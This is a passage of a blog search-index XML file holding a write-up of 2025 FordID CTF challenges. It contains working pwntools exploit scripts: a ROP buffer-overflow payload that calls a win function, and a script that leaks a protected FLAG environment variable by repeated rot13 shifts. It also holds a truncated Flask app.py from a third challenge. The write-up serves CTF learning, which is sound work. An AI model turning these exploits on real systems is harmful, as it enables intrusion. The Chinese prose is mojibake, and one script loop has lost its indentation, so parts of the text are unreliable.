<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025 FordID CTF</title>
    <link href="/2025/09/14/2025-FordID-CTF/"/>
    <url>/2025/09/14/2025-FordID-CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="pwnï¼ˆé™„ä»¶ï¼šhandout-2ï¼‰"><a href="#pwnï¼ˆé™„ä»¶ï¼šhandout-2ï¼‰" class="headerlink" title="pwnï¼ˆé™„ä»¶ï¼šhandout 2ï¼‰"></a>pwnï¼ˆé™„ä»¶ï¼šhandout 2ï¼‰</h1><p>Stumbled upon Rust recently, still learning the ropesâ€¦</p><p>çœ‹ä¸‹ç¨‹åºï¼Œæ˜¯ç”¨ <code>rust</code> è¯­è¨€å†™çš„</p><span id="more"></span><p>64ä½ç¨‹åºï¼Œå•¥ä¿æŠ¤æ²¡å¼€ï¼Œç®€å•çš„ROPï¼Œæ³„éœ²ä¸‹åŸºå€æ‰“ <code>libc</code> ç„¶å <code>system(&#39;/bin/sh&#39;)</code> ã€‚</p><p><img src="/images/2025-FordID-CTF.png" alt="img"></p><p>å¥½å§æœ‰åé—¨å‡½æ•°ï¼Œä¸ç”¨æ‰“ <code>libc</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.update(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&quot;Linux&quot;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><br>url = <span class="hljs-string">&quot;0.cloud.chals.io:31984&quot;</span><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, <span class="hljs-built_in">int</span>(POST))<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># puts_plt = elf.plt[&#x27;puts&#x27;]</span><br>pop_rdi_ret = <span class="hljs-number">0x23c5ba</span><br>ret = <span class="hljs-number">0x23c334</span><br><span class="hljs-comment"># read_got = elf.got[&#x27;read&#x27;]</span><br><span class="hljs-comment"># vuln = 0x23C520</span><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># b main</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br>win = <span class="hljs-number">0x23C4E0</span><br>bin_sh = <span class="hljs-number">0x2032E0</span><br><br>ru(<span class="hljs-string">b&#x27;Say something:\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(pop_rdi_ret) + p64(<span class="hljs-number">0xDEADBEEFCAFEBABE</span>) + p64(ret) + p64(win)<br>sl(payload)<br>ia()<br></code></pre></td></tr></table></figure><h1 id="Protect-the-environment"><a href="#Protect-the-environment" class="headerlink" title="Protect the environment"></a>Protect the environment</h1><p>å¼€äº† <code>canary</code> å’Œ <code>pie</code> ä¿æŠ¤</p><p>å…ˆçœ‹ç¨‹åºé‡Œé¢å“ªé‡Œå¯èƒ½ä¼šæœ‰æ¼æ´ã€‚æºç è‡ªå·±å†™äº†ä¸€ä¸ªå‡½æ•°ï¼š <code>rot13</code> è¿”å›å€¼æ˜¯ä¸€ä¸ªåœ°å€ã€‚åº”è¯¥é—®é¢˜å°±å‡ºç°åœ¨è¿™å„¿äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rot13</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> &#123;<br>  <span class="hljs-keyword">while</span> (*s != <span class="hljs-number">0</span>) &#123;<br>    *s += <span class="hljs-number">13</span>;<br>    s++;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-type">char</span> command[<span class="hljs-number">64</span>];<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%63s %63s&quot;</span>, command, name);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;protect&quot;</span>)) &#123;<br>      <span class="hljs-type">char</span> *val = getenv(name);<br>      <span class="hljs-keyword">if</span> (val) &#123;<br>        rot13(val);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Protected %s\n&quot;</span>, name);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;print&quot;</span>)) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;FLAG&quot;</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access denied\n&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> *val = getenv(name);<br>        <span class="hljs-keyword">if</span> (val) &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s=%s\n&quot;</span>, name, val);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown command\n&quot;</span>);<br>      <span class="hljs-keyword">break</span> ;<br>    &#125;<br>  &#125; <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆæŠŠè¿™ä¸ªå¯æ‰§è¡Œç¨‹åºçš„ç›¸å…³åŠ¨æ€é“¾æ¥å™¨å’Œé“¾æ¥åº“ç»™æ”¹äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --set-interpreter /home/spongebob/Document/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so pwn<br>patchelf --replace-needed libc.so.6 ~/Document/pwn/protect_our_env/libc-2.27.so  pwn<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¤§æ¦‚åˆ†ä¸ºä¸¤ç§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; protect<br>PATH<br>Protected PATH<br>&gt; ^C<br>spongebob@spongebob:~/Document/pwn/protect_our_env$ ./pwn<br>&gt; <span class="hljs-built_in">print</span><br>PATH<br>PATH=/home/spongebob/.local/bin:/home/spongebob/.vscode-server/cli/servers/Stable-f220831ea2d946c0dcb0f3eaa480eb435a2c1260/server/bin/remote-cli:/home/spongebob/.cargo/bin:/home/spongebob/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/musl/bin/:/usr/local/musl/bin/<br>&gt; ^C<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªæ˜¯ä¿æŠ¤ç¯å¢ƒå˜é‡ï¼Œç„¶åæŠŠè¿™ä¸ªåœ°å€å¤„çš„ç¯å¢ƒå˜é‡å¯¹åº”çš„ <code>value</code> ç»™ä¿®æ”¹äº†ï¼ˆç”¨ <code>rot13</code> ï¼‰</p><p>å¦ä¸€ä¸ªæ˜¯æ‰“å°ç¯å¢ƒå˜é‡ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; protect<br>PATH<br>Protected PATH<br>&gt; <span class="hljs-built_in">print</span><br>PATH<br>PATH=&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;y|pny&lt;ov&#123;G&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;p|qr:rr&lt;pyv&lt;rr&lt;`noyr:s??=E@&gt;rn?qFACp=qpo=s@rnnAE=roA@Bn?p&gt;?C=&lt;rr&lt;ov&#123;&lt;rz|r:pyvG&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;pnt|&lt;ov&#123;G&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;y|pny&lt;ov&#123;G&lt;&lt;<span class="hljs-string">y|pny&lt;ov&#123;G&lt;&lt;y</span>|pny&lt;ov&#123;G&lt;&lt;<span class="hljs-string">ov&#123;G&lt;&lt;ov</span>&#123;G&lt;ov&#123;G&lt;ov&#123;G&lt;&lt;<span class="hljs-string">tnzrG&lt;&lt;y|pny&lt;tnzrG</span>&lt;&#123;n&#125;&lt;ov&#123;G&lt;&lt;<span class="hljs-string">y|pny&lt;zy&lt;ov&#123;&lt;G&lt;&lt;y</span>|pny&lt;zy&lt;ov&#123;&lt;<br></code></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯å†™å…¥ç¯å¢ƒå˜é‡ç›¸å…³è¿›è¡Œä¿®æ”¹ï¼Œä½†è¿™æ–¹é¢è¿˜æ²¡äº†è§£è¿‡ã€‚</p><p>[BUUCTF-pwn]â€”â€”wdb2018_guess (environç¯å¢ƒå˜é‡) æ˜¯ä¸€é“ç±»ä¼¼çš„é¢˜ç›®</p><p>åœ¨Linux Cä¸­ï¼Œenvironæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒå‚¨å­˜ç€ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ã€‚</p><p>å®ƒå‚¨å­˜åœ¨libcä¸­ï¼Œå› æ­¤environæ˜¯æ²Ÿé€šlibcåœ°å€ä¸æ ˆåœ°å€çš„æ¡¥æ¢ã€‚</p><p>å¥½å§æ•´ä¸ªæ–¹å‘éƒ½é”™äº†ï½</p><p>ç”±äº <code>flag</code> æ ¼å¼éƒ½ä¸º <code>FordID&#123;...&#125;</code> ï¼Œæ‰€ä»¥å…³äº <code>FLAG</code> ç¯å¢ƒå˜é‡å†…å®¹åº”è¯¥ä¸ºï¼š<br>       <code>FLAG=FordID&#123;...&#125;</code></p><p>æ—¢ç„¶ç›´æ¥ <code>print FLAG</code> ä¸è¡Œï¼Œå¯ä»¥é€šè¿‡ä¸æ–­çš„ <code>protect</code> ï¼Œç„¶åå°†å†…å®¹ä¸­çš„ <code>F</code> æ”¹ä¸º <code>=</code> ï¼Œç„¶åè¿›è¡Œï¼š <code>print FLAG=</code> å°±è¡Œäº†ã€‚</p><p>å¦‚ä½•å°† <code>F</code> æ”¹ä¸º <code>=</code> å‘¢ï¼Ÿç”±äºæºç ä¸­:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rot13</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> &#123;<br>  <span class="hljs-keyword">while</span> (*s != <span class="hljs-number">0</span>) &#123;<br>    *s += <span class="hljs-number">13</span>;<br>    s++;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹å­—ç¬¦æŒ‡é’ˆä¸æ–­è¿›è¡ŒåŠ ä¼šæœ‰ä»€ä¹ˆæº¢å‡ºæ•ˆæœï¼Œåº”è¯¥æ˜¯é«˜ä½æº¢å‡ºä¸ç®¡ï¼Œä¸€ä¸ªå­—èŠ‚æº¢å‡ºç›¸å½“äº <code>%256</code> ã€‚è°ƒè¯•çœ‹ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/images/2025_FordID-ctf2.png" alt="image.png"></p><p>æ‰€ä»¥åªéœ€è¦ç®—å‡ºå¤šå°‘è½®èƒ½ä» <code>F</code> å˜æˆ <code>=</code> å°±è¡Œäº†ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.update(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&quot;Linux&quot;</span>)<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><br>url = <span class="hljs-string">&quot;0.cloud.chals.io:33121&quot;</span><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, <span class="hljs-built_in">int</span>(POST))<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>io = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>env_value = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_env_value</span>(<span class="hljs-params">env_name</span>):<br>    ru(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    payload = <span class="hljs-string">&quot;print &quot;</span> + env_name<br>    sl(payload.encode())<br>    data = rl().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;No&quot;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span><br>    data = data.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>]<br>    env_value[env_name] = data<br><br>env = [<span class="hljs-string">&quot;PATH&quot;</span>,<span class="hljs-string">&quot;HOME&quot;</span>,<span class="hljs-string">&quot;LANG&quot;</span>,<span class="hljs-string">&quot;SHELL&quot;</span>,<span class="hljs-string">&quot;USER&quot;</span>,<span class="hljs-string">&quot;PWD&quot;</span>,<span class="hljs-string">&quot;LOGNAME&quot;</span>,<span class="hljs-string">&quot;TZ&quot;</span>,<span class="hljs-string">&quot;TERM&quot;</span>,<span class="hljs-string">&quot;LC_ALL&quot;</span>,<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>]<br><span class="hljs-keyword">for</span> env_name <span class="hljs-keyword">in</span> env:<br>    test_env_value(env_name)<br><br><span class="hljs-built_in">print</span>(env_value)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;F&#x27;</span>) + i * <span class="hljs-number">13</span>) % <span class="hljs-number">256</span>) == <span class="hljs-string">&#x27;=&#x27;</span>:<br>num = i<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&quot;protect FLAG&quot;</span>)<br>    rl()<br><br>sla(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&quot;print FLAG=&quot;</span>)<br>data = rl().decode()<br>data = data.split(<span class="hljs-string">&#x27;G=&#x27;</span>)[<span class="hljs-number">1</span>]<br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> data:<br>    result += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(ch) - <span class="hljs-number">13</span> * <span class="hljs-number">19</span>) % <span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h1 id="Meta-2-0"><a href="#Meta-2-0" class="headerlink" title="Meta 2.0"></a>Meta 2.0</h1><p>è¿™ä¸ªé¢˜ç»™å‡ºçš„ <a href="http://app.py/"><code>app.py</code></a> å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pathlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, abort, jsonify, render_template, request<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><span class="hljs-keyword">import</span> magic<br><br>app = Flask(__name__)<br>TMP_PARENT = pathlib.Path(<span class="hljs-string">&quot;/tmp/metabox&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">cmd, cwd=<span class="hljs-literal">None</span>, timeout=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Return (stdout, stderr, exit_code).&quot;&quot;&quot;</span><br>    proc = subprocess.run(<br>        cmd,<br>        cwd=cwd,<br>        stdout=subprocess.PIPE,<br>        stderr=subprocess.PIPE,<br>        text=<span class="hljs-literal">True</span>,<br>        timeout=timeout,<br>        env=os.environ,<br>    )<br>    <span class="hljs-keyword">return</span> proc.stdout, proc.stderr, proc.returncode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_pdf</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, code = run([<span class="hljs-string">&quot;pdfinfo&quot;</span>, <span class="hljs-built_in">str</span>(file_path)])<br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;pdfinfo failed&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    meta = &#123;&#125;<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> stdout.splitlines():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-keyword">in</span> line:<br>            k, v = line.split(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-number">1</span>)<br>            meta[k.strip()] = v.strip()<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_node_project</span>(<span class="hljs-params">path: pathlib.Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> (path / <span class="hljs-string">&quot;package.json&quot;</span>).is_file()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_node_project</span>(<span class="hljs-params">extract_dir: pathlib.Path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(extract_dir / <span class="hljs-string">&quot;package.json&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            pkg = json.load(f)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;package.json parse failed&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    subset = &#123;<br>        k: pkg[k]<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> (<span 